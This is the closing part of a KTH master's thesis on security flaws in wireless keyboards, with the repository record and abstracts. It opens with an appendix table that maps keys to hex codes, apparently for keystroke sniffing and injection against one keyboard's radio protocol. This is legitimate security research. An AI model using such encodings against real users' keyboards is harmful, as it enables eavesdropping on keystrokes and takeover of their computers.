,→0x0000000000000001000000000000000000000000],
142 | Appendix A: Supporting material
”a”: [0x0000000000200000000000000000000000000000, 0],
”b”: [0x0000000000000040000000000000000000000000, 0],
”c”: [0x0000000000000010000000000000000000000000, 0],
”d”: [0x0000000000800000000000000000000000000000, 0],
”e”: [0x0000000008000000000000000000000000000000, 0],
”f”: [0x0000000000000100000000000000000000000000, 0],
”g”: [0x0000000000000200000000000000000000000000, 0],
”h”: [0x0000000000000400000000000000000000000000, 0],
”i”: [0x0000000000010000000000000000000000000000, 0],
”j”: [0x0000000000000800000000000000000000000000, 0],
”k”: [0x0000000000001000000000000000000000000000, 0],
”l”: [0x0000000000002000000000000000000000000000, 0],
”m”: [0x0000000000000000010000000000000000000000, 0],
”n”: [0x0000000000000080000000000000000000000000, 0],
”o”: [0x0000000000020000000000000000000000000000, 0],
”p”: [0x0000000000040000000000000000000000000000, 0],
”q”: [0x0000000002000000000000000000000000000000, 0],
”r”: [0x0000000010000000000000000000000000000000, 0],
”s”: [0x0000000000400000000000000000000000000000, 0],
”t”: [0x0000000020000000000000000000000000000000, 0],
”u”: [0x0000000080000000000000000000000000000000, 0],
”v”: [0x0000000000000020000000000000000000000000, 0],
”w”: [0x0000000004000000000000000000000000000000, 0],
”x”: [0x0000000000000008000000000000000000000000, 0],
”y”: [0x0000000040000000000000000000000000000000, 0],
”z”: [0x0000000000000004000000000000000000000000, 0],
”{”: [0x0000000800000000000000000000000000000000,
,→0x0000000000000000000800000000000000000000],
”|”: [0x0000000000000002000000000000000000000000,
,→0x0000000000000000000800000000000000000000],
”}”: [0x0000004000000000000000000000000000000000,
,→0x0000000000000000000800000000000000000000],
”BACKSPACE”: [0x0000000000000000000000400000000000000000, 0],
” ”: [0x0000000000000000000100000000000000000000, 0],
”£”: [0x0000800000000000000000000000000000000000,
,→0x0000000000000000000800000000000000000000],
”¤”: [0x0000000100000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”§”: [0x0000100000000000000000000000000000000000, 0],
”«”: [0x0000000000000004000000000000000000000000,
,→0x0000000000000000000800000000000000000000],
”µ”: [0x0000000000000000010000000000000000000000,
,→0x0000000000000000000800000000000000000000],
”½”: [0x0000100000000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”Ä”: [0x0000000000008000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”Å”: [0x0000000000080000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”Ö”: [0x0000000000004000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”ß”: [0x0000000000400000000000000000000000000000,
,→0x0000000000000000000800000000000000000000],
”ä”: [0x0000000000008000000000000000000000000000, 0],
”å”: [0x0000000000080000000000000000000000000000, 0],
”ð”: [0x0000000000800000000000000000000000000000,
,→0x0000000000000000000800000000000000000000],
”ö”: [0x0000000000004000000000000000000000000000, 0],
”þ”: [0x0000000020000000000000000000000000000000,
Appendix A: Supporting material | 143
,→0x0000000000000000000800000000000000000000],€
””: [0x0000000008000000000000000000000000000000,
,→0x0000000000000000000800000000000000000000],
’’: [0xCD01CA9DADAD39B03C7417E8F15701BB01172D39, 0],
’ALT’: [0, 0x0000000000000000400000000000000000000000],
’SHIFT’: [0, 0x0000000000000001000000000000000000000000],
’CTRL’: [0, 0x0000000000000000100000000000000000000000],
’GUI’: [0, 0x0000000000000000200000000000000000000000],
4: [0, 0x0000000000000000400000000000000000000000],
2: [0, 0x0000000000000001000000000000000000000000],
1: [0, 0x0000000000000000100000000000000000000000],
8: [0, 0x0000000000000000200000000000000000000000],
’SCROLLLOCK’: [0x0000000000000000000004000000000000000000, 0],
’ENTER’: [0x0000000000000000000000040000000000000000, 0],
’F12’: [0x0000000000000000000001000000000000000000, 0],
’HOME’: [0x0000000000000000000020000000000000000000, 0],
’F10’: [0x0000040000000000000000000000000000000000, 0],
’F9’: [0x0000020000000000000000000000000000000000, 0],
’ESCAPE’: [0x0001000000000000000000000000000000000000, 0],
’PAGEUP’: [0x0000000000000000000040000000000000000000, 0],
’TAB’: [0x0000000001000000000000000000000000000000, 0],
’PRINTSCREEN’:[0x0000000000000000000002000000000000000000, 0],
’F2’: [0x0004000000000000000000000000000000000000, 0],
’CAPSLOCK’: [0x0000000000100000000000000000000000000000, 0],
’F1’: [0x0002000000000000000000000000000000000000, 0],
’F4’: [0x0010000000000000000000000000000000000000, 0],
’F6’: [0x0040000000000000000000000000000000000000, 0],
’F8’: [0x0000010000000000000000000000000000000000, 0],
’DOWNARROW’: [0x0000000000000000000000004000000000000000, 0],
’DELETE’: [0x0000000000000000000000800000000000000000, 0],
’RIGHT’: [0x0000000000000000000000008000000000000000, 0],
’F3’: [0x0008000000000000000000000000000000000000, 0],
’DOWN’: [0x0000000000000000000000004000000000000000, 0],
’DEL’: [0x0000000000000000000000800000000000000000, 0],
’END’: [0x0000000000000000000000000100000000000000, 0],
’INSERT’: [0x0000000000000000000010000000000000000000, 0],
’F5’: [0x0020000000000000000000000000000000000000, 0],
’LEFTARROW’: [0x0000000000000000000000002000000000000000, 0],
’RIGHTARROW’: [0x0000000000000000000000008000000000000000, 0],
’PAGEDOWN’: [0x0000000000000000000000000200000000000000, 0],
’PAUSE’: [0x0000000000000000000008000000000000000000, 0],
’SPACE’: [0x0000000000000000000100000000000000000000, 0],
’UPARROW’: [0x0000000000000000000000001000000000000000, 0],
’F11’: [0x0000080000000000000000000000000000000000, 0],
’F7’: [0x0080000000000000000000000000000000000000, 0],
’UP’: [0x0000000000000000000000001000000000000000, 0],
’LEFT’: [0x0000000000000000000000002000000000000000, 0]
TRITA-EECS-EX-2022:644
www.kth.se
For DIVA
{
”Author1”: { ”Last name”: ”T omsic”,
”First name”: ”Niklas”,
”Local User Id”: ”u127oimy”,
”E-mail”: ”ntomsic@kth.se”,
”organisation”: {”L1”: ”School of Electrical Engineering and Computer Science”,
}
},
”Cycle”: ”2”,
”Course code”: ”DA231X”,
”Credits”: ”30”,
”Degree1”: {”Educational program”: ”Master’s Programme, Computer Science, 120 credits”
,”programcode”: ”TCSCM”
,”Degree”: ”Degree of Master (120 credits)”
,”subjectArea”: ”Computer Science and Engineering”
},
”Title”: {
”Main title”: ”Penetration testing wireless keyboards”,
”Subtitle”: ”Are your devices vulnerable?”,
”Language”: ”eng” },
”Alternative title”: {
”Main title”: ”Penetrationstest av trådlösa tangentbord”,
”Subtitle”: ”Är dina enheter sårbara?”,
”Language”: ”swe”
},
”Supervisor1”: { ”Last name”: ”Guanciale”,
”First name”: ”Roberto”,
”Local User Id”: ”u1f9irum”,
”E-mail”: ”robertog@kth.se”,
”organisation”: {”L1”: ”School of Electrical Engineering and Computer Science”,
”L2”: ”Computer Science” }
},
”Supervisor2”: { ”Last name”: ”von Konow”,
”First name”: ”Johan”,
”E-mail”: ”jkw@cparta.se”,
”Other organisation”: ”Cparta Cyber Defense”
},
”Examiner1”: { ”Last name”: ”Maguire Jr.”,
”First name”: ”Gerald Quentin”,
”Local User Id”: ”u1d13i2c”,
”E-mail”: ”maguire@kth.se”,
”organisation”: {”L1”: ”School of Electrical Engineering and Computer Science”,
”L2”: ”Computer Science” }
},
”Cooperation”: { ”Partner_name”: ”Cparta Cyber Defense”},
"National Subject Categories": "10201",
”Other information”: {”Y ear”: ”2022”, ”Number of pages”: ” xxi ,143 ”},
”Series”: { ”Title of series”: ”TRIT A-EECS-EX” , ”No. in series”: ”2022:00” },
”Opponents”: { ”Name”: ”Oscar Almqvist”},
”Presentation”: { ”Date”: ”2022-08-05 13:00”
,”Language”:”eng”
,”Room”: ”via Zoom https://kth-se.zoom.us/j/69896857187”
,”Address”: ”Isafjordsgatan 22 (Kistagången 16)”
,”City”: ”Stockholm” },
”Number of lang instances”: "2",
”Abstract[eng]”: €€€€
With an ever-increasing amount of cyberespionage and cybercrime, any potential attack vector into a
computer system is worthy of investigation. One such vector could be through the wireless keyboard
the user themselves use and trust. If an attacker was able to intercept the traffic between the
keyboard and the computer they could spy on every keystroke that is being sent to the computer.
Additionally, they could potentially inject keystrokes as if they were sitting at the computer
themselves. This thesis evaluated 10 different keyboards that were purchased in common consumer
electronic stores and 8 of them were found to have new substantial flaws that made it possible to
reliably listen to every keystroke sent by the keyboards, as well as allow an attacker to send
keystrokes to the connected computer, indirectly giving the attacker full control of the computer. It
was concluded that wireless keyboards should not be used in situations where sensitive information is
handled \ textbf{regardless} of what the keyboard manufacturer claims, as it creates a potential
attack vector that is otherwise nonexistent.
€€€€,
”Keywords[eng]”: €€€€
Wireless keyboards, penetration testing, radio frequency analysis, Crazyradio, MouseJack, Enhanced ShockBurst €€€€,
”Abstract[swe]”: €€€€
Med en ständigt ökande mängd cyberspionage och cyberbrottslighet så är alla potentiella vägar in i
ett datorsystem värda att undersöka. Ett sätt att ta sig in i ett system skulle kunna vara genom det
trådlösa tangentbord som användaren själv använder och litar på. Om en angripare hade möjligheten att
fånga upp trafiken mellan tangentbordet och datorn skulle den kunna lyssna på varenda knapptryck som
skickades till datorn. Utöver det så skulle en angripare möjligen kunna skicka egna knapptryck till
datorn som om den själv satt vid den. Den här uppsatsen har studerat och utvärderat 10 olika
tangentbord som köptes i vanliga elektronikaffärer och i 8 av dem hittades nya allvarliga brister som
gjorde det möjligt att både avlyssna vad som skrevs samt att kunna skicka knapptryck till datorn som
tangentbordet var kopplat till. Detta ledde indirekt till full kontroll över datorn. Slutsatsen som
kunde dras var att trådlösa tangentbord inte bör användas i någon situation där känsligt innehåll
hanteras, oavsett vad tillverkaren av tangentbordet hävdar. Detta då det öppnar upp en ny attackyta
som inte finns om trådlösa tangentbord inte används.
€€€€,
”Keywords[swe]”: €€€€
T rådlösa tangentbord, penetrationstest, radiofrekvensanalys, Crazyradio, MouseJack, Enhanced ShockBurst €€€€,
}

=== Content from kth.diva-portal.org_25f84684_20250108_133400.html ===


[kth.se](http://www.kth.se/en/kthb)Publications

|  | Please wait ... |
| --- | --- |

[Simple search](/smash/search.jsf?dswid=-3616&searchType=SIMPLE&faces-redirect=true&query=&af=%5B%5D&aq=%5B%5B%5D%5D&aqe=%5B%5D&aq2=%5B%5B%5D%5D "Simple search")[Advanced search -
 Research publications](/smash/search.jsf?dswid=-3616&searchType=RESEARCH&faces-redirect=true&query=&af=%5B%5D&aq=%5B%5B%5D%5D&aqe=%5B%5D&aq2=%5B%5B%5D%5D "Research publications")[Advanced search -
 Student theses](/smash/search.jsf?dswid=-3616&searchType=UNDERGRADUATE&faces-redirect=true&query=&af=%5B%5D&aq=%5B%5B%5D%5D&aqe=%5B%5D&aq2=%5B%5B%5D%5D)[Statistics](/smash/statistics.jsf?dswid=-3616&faces-redirect=true&statisticType=web "Statistics")

[English](/smash/record.jsf?dswid=-3616&faces-redirect=true&language=en&searchType=SIMPLE&query=&af=%5B%5D&aq=%5B%5B%5D%5D&aq2=%5B%5B%5D%5D&aqe=%5B%5D&pid=diva2%3A1701492&noOfRows=50&sortOrder=author_sort_asc&sortOrder2=title_sort_asc&onlyFullText=false&sf=all)[Svenska](/smash/record.jsf?dswid=-3616&faces-redirect=true&language=sv&searchType=SIMPLE&query=&af=%5B%5D&aq=%5B%5B%5D%5D&aq2=%5B%5B%5D%5D&aqe=%5B%5D&pid=diva2%3A1701492&noOfRows=50&sortOrder=author_sort_asc&sortOrder2=title_sort_asc&onlyFullText=false&sf=all)[Norsk](/smash/record.jsf?dswid=-3616&faces-redirect=true&language=no&searchType=SIMPLE&query=&af=%5B%5D&aq=%5B%5B%5D%5D&aq2=%5B%5B%5D%5D&aqe=%5B%5D&pid=diva2%3A1701492&noOfRows=50&sortOrder=author_sort_asc&sortOrder2=title_sort_asc&onlyFullText=false&sf=all)
[Jump to content](#formSmash:items:resultList)
Change searchSearchSearch
Only documents with full text in DiVA

* Penetration testing wireless keyboards: Are your devices vulnerable?

CiteExport

* [BibTex](references?referenceFormat=BIBTEX&pids=[diva2:1701492]&fileName=export.bib)
* [CSL-JSON](references?referenceFormat=CSL_JSON&pids=[diva2:1701492]&fileName=export.json)
* [CSV 1](references?referenceFormat=CSV01&pids=[diva2:1701492]&fileName=export.csv)
* [CSV 2](references?referenceFormat=CSV02&pids=[diva2:1701492]&fileName=export.csv)
* [CSV 3](references?referenceFormat=CSV03&pids=[diva2:1701492]&fileName=export.csv)
* [CSV 4](references?referenceFormat=CSV04&pids=[diva2:1701492]&fileName=export.csv)
* [CSV 5](references?referenceFormat=CSV05&pids=[diva2:1701492]&fileName=export.csv)
* [CSV all metadata](references?referenceFormat=CSVALL&pids=[diva2:1701492]&fileName=export.csv)
* [CSV all metadata version 2](references?referenceFormat=CSVALL2&pids=[diva2:1701492]&fileName=export.csv)
* [RIS](references?referenceFormat=RIS&pids=[diva2:1701492]&fileName=export.ris)
* [Mods](references?referenceFormat=MODS&pids=[diva2:1701492]&fileName=export.xml)
* [MARC-XML](references?referenceFormat=MARC&pids=[diva2:1701492]&fileName=export.xml)
* [ETDMS](references?referenceFormat=ETDMS&pids=[diva2:1701492]&fileName=export.xml)
Link to record
Permanent link
https://urn.kb.se/resolve?urn=urn:nbn:se:kth:diva-319693Direct link
http://kth.diva-portal.org/smash/record.jsf?pid=diva2:1701492

Cite
Citation styleapaieeemodern-language-association-8th-editionvancouverOther style

* apa
* ieee
* modern-language-association-8th-edition
* vancouver
* Other style
[More styles](https://github.com/citation-style-language/styles)Languagede-DEen-GBen-USfi-FInn-NOnn-NBsv-SEOther locale

* de-DE
* en-GB
* en-US
* fi-FI
* nn-NO
* nn-NB
* sv-SE
* Other locale
[More languages](https://github.com/citation-style-language/locales)Output formathtmltextasciidocrtf

* html
* text
* asciidoc
* rtf
CreateClose

Penetration testing wireless keyboards: Are your devices vulnerable?
### Tomsic, Niklas

KTH, School of Electrical Engineering and Computer Science (EECS).
2022 (English)Independent thesis Advanced level (degree of Master (Two Years)), 20 credits / 30 HE creditsStudent thesisAlternative title
Penetrationstest av trådlösa tangentbord : Är dina enheter sårbara? (Swedish)
##### Abstract [en]

With an ever-increasing amount of cyberespionage and cybercrime, any potential attack vector into a computer system is worthy of investigation. One such vector could be through the wireless keyboard the user themselves use and trust. If an attacker was able to intercept the traffic between the keyboard and the computer they could spy on every keystroke that is being sent to the computer. Additionally, they could potentially inject keystrokes as if they were sitting at the computer themselves. This thesis evaluated 10 different keyboards that were purchased in common consumer electronic stores and 8 of them were found to have new substantial flaws that made it possible to reliably listen to every keystroke sent by the keyboards, as well as allow an attacker to send keystrokes to the connected computer, indirectly giving the attacker full control of the computer. It was concluded that wireless keyboards should not be used in situations where sensitive information is handled regardless of what the keyboard manufacturer claims, as it creates a potential attack vector that is otherwise nonexistent.

##### Abstract [sv]

Med en ständigt ökande mängd cyberspionage och cyberbrottslighet så är alla potentiella vägar in i ett datorsystem värda att undersöka. Ett sätt att ta sig in i ett system skulle kunna vara genom det trådlösa tangentbord som användaren själv använder och litar på. Om en angripare hade möjligheten att fånga upp trafiken mellan tangentbordet och datorn skulle den kunna lyssna på varenda knapptryck som skickades till datorn. Utöver det så skulle en angripare möjligen kunna skicka egna knapptryck till datorn som om den själv satt vid den. Den här uppsatsen har studerat och utvärderat 10 olika tangentbord som köptes i vanliga elektronikaffärer och i 8 av dem hittades nya allvarliga brister som gjorde det möjligt att både avlyssna vad som skrevs samt att kunna skicka knapptryck till datorn som tangentbordet var kopplat till. Detta ledde indirekt till full kontroll över datorn. Slutsatsen som kunde dras var att trådlösa tangentbord inte bör användas i någon situation där känsligt innehåll hanteras, oavsett vad tillverkaren av tangentbordet hävdar. Detta då det öppnar upp en ny attackyta som inte finns om trådlösa tangentbord inte används.

##### Place, publisher, year, edition, pages

Stockholm: KTH Royal Institute of Technology , 2022. , p. xxi,143
##### Series

TRITA-EECS-EX ; 2022:644
##### Keywords [en]

Wireless keyboards, penetration testing, radio frequency analysis, Crazyradio, MouseJack, Enhanced ShockBurst
##### Keywords [sv]

Trådlösa tangentbord, penetrationstest, radiofrekvensanalys, Crazyradio, MouseJack, Enhanced ShockBurst
##### National Category

Computer Sciences
##### Identifiers

URN: [urn:nbn:se:kth:diva-319693](https://urn.kb.se/resolve?urn=urn%3Anbn%3Ase%3Akth%3Adiva-319693 "Permanent link")OAI: oai:DiVA.org:kth-319693DiVA, id: [diva2:1701492](http://kth.diva-portal.org/smash/record.jsf?pid=diva2%3A1701492 "Direct link")
##### External cooperation

Cparta Cyber Defense
##### Subject / course

Computer Science
##### Educational program

Master of Science - Computer Science
##### Presentation

2022-08-05, via Zoom https://kth-se.zoom.us/j/69896857187, Isafjordsgatan 22 (Kistagången 16), Stockholm, 13:00 (English)
#####

##### Supervisors

### Guanciale, Roberto

KTH, School of Electrical Engineering and Computer Science (EECS), Computer Science.
### von Konow, Johan

Cparta Cyber Defense.
##### Examiners

### Maguire Jr., Gerald Quentin

KTH, School of Electrical Engineering and Computer Science (EECS), Computer Science.Available from: 2022-10-07 Created: 2022-10-06 Last updated: 2022-10-24Bibliographically approved

#### Open Access in DiVA

[fulltext](get/diva2%3A1701492/FULLTEXT01.pdf "fulltext")(42592 kB)![](/smash/javax.faces.resource/info.png.jsf?ln=images)12821 downloads
##### File information

File name FULLTEXT01.pdfFile size 42592 kBChecksum SHA-512de67ebab8d028087ac13d4881d32ce13bbfb4ffe702f12206855c63c971c8bdf587fb403b7c449df8082a5bc19a4396d219383954783a1ba7d5a9042d13c46feType fulltextMimetype application/pdf
####

#### Search in DiVA

##### By author/editor

[Tomsic, Niklas](/smash/resultList.jsf?dswid=-3616&af=%5B%5D&aq=%5B%5B%7B%22personId%22%3A%22u127oimy%22%7D%5D%5D&aqe=%5B%5D&aq2=%5B%5B%5D%5D&language=en&query= "Tomsic, Niklas")
##### By organisation

[School of Electrical Engineering and Computer Science (EECS)](/smash/resultList.jsf?dswid=-3616&af=%5B%5D&aq=%5B%5B%7B%22organisationId%22%3A%22879223%22%7D%5D%5D&aqe=%5B%5D&aq2=%5B%5B%5D%5D&language=en&query= "School of Electrical Engineering and Computer Science (EECS)")
##### On the subject

[Computer Sciences](/smash/resultList.jsf?dswid=-3616&af=%5B%5D&aq=%5B%5B%7B%22categoryId%22%3A%2211510%22%7D%5D%5D&aqe=%5B%5D&aq2=%5B%5B%5D%5D&language=en&query= "Computer Sciences")
#### Search outside of DiVA

[Google](https://www.google.com/search?q=Penetration%20testing%20wireless%20keyboards%3A%20Are%20your%20devices%20vulnerable%3F)[Google Scholar](https://scholar.google.com/scholar?q=Penetration%20testing%20wireless%20keyboards%3A%20Are%20your%20devices%20vulnerable%3F)Total: 12830 downloads![](/smash/javax.faces.resource/info.png.jsf?ln=images)The number of downloads is the sum of all downloads of full texts. It may include eg previous versions that are now no longer available
####

urn-nbn
#### Altmetric score

urn-nbnTotal: 51636 hits

CiteExport

* [BibTex](references?referenceFormat=BIBTEX&pids=[diva2:1701492]&fileName=export.bib)
* [CSL-JSON](references?referenceFormat=CSL_JSON&pids=[diva2:1701492]&fileName=export.json)
* [CSV 1](references?referenceFormat=CSV01&pids=[diva2:1701492]&fileName=export.csv)
* [CSV 2](references?referenceFormat=CSV02&pids=[diva2:1701492]&fileName=export.csv)
* [CSV 3](references?referenceFormat=CSV03&pids=[diva2:1701492]&fileName=export.csv)
* [CSV 4](references?referenceFormat=CSV04&pids=[diva2:1701492]&fileName=export.csv)
* [CSV 5](references?referenceFormat=CSV05&pids=[diva2:1701492]&fileName=export.csv)
* [CSV all metadata](references?referenceFormat=CSVALL&pids=[diva2:1701492]&fileName=export.csv)
* [CSV all metadata version 2](references?referenceFormat=CSVALL2&pids=[diva2:1701492]&fileName=export.csv)
* [RIS](references?referenceFormat=RIS&pids=[diva2:1701492]&fileName=export.ris)
* [Mods](references?referenceFormat=MODS&pids=[diva2:1701492]&fileName=export.xml)
* [MARC-XML](references?referenceFormat=MARC&pids=[diva2:1701492]&fileName=export.xml)
* [ETDMS](references?referenceFormat=ETDMS&pids=[diva2:1701492]&fileName=export.xml)
Link to record
Permanent link
https://urn.kb.se/resolve?urn=urn:nbn:se:kth:diva-319693Direct link
http://kth.diva-portal.org/smash/record.jsf?pid=diva2:1701492

Cite
Citation styleapaieeemodern-language-association-8th-editionvancouverOther style

* apa
* ieee
* modern-language-association-8th-edition
* vancouver
* Other style
[More styles](https://github.com/citation-style-language/styles)Languagede-DEen-GBen-USfi-FInn-NOnn-NBsv-SEOther locale

* de-DE
* en-GB
* en-US
* fi-FI
* nn-NO
* nn-NB
* sv-SE
* Other locale
[More languages](https://github.com/citation-style-language/locales)Output formathtmltextasciidocrtf

* html
* text
* asciidoc
* rtf
CreateClose

v. 2.45.0|
[WCAG](https://www.info.diva-portal.org/w/diva/en/about-diva/accessibility-report---diva)
|
[KTH Library](http://www.kth.se/en/kthb)
|
[DiVA support](https://www.kth.se/en/biblioteket/anvanda-biblioteket/oppettider-kontakt/kontaktformular-1.863120)
|
[Register in DiVA](https://www.kth.se/en/biblioteket/publicera-analysera/hantera-publikationer/registrering-av-forskningspublikationer-1.854776)
|
[Posting your thesis](https://www.kth.se/en/biblioteket/publicera-analysera/hantera-publikationer/spika-avhandling-licentiatuppsats-1.854781)
|
[SwePub](http://swepub.kb.se/form_extended.jsp)

[DiVA

Logotyp](http://www.diva-portal.org)


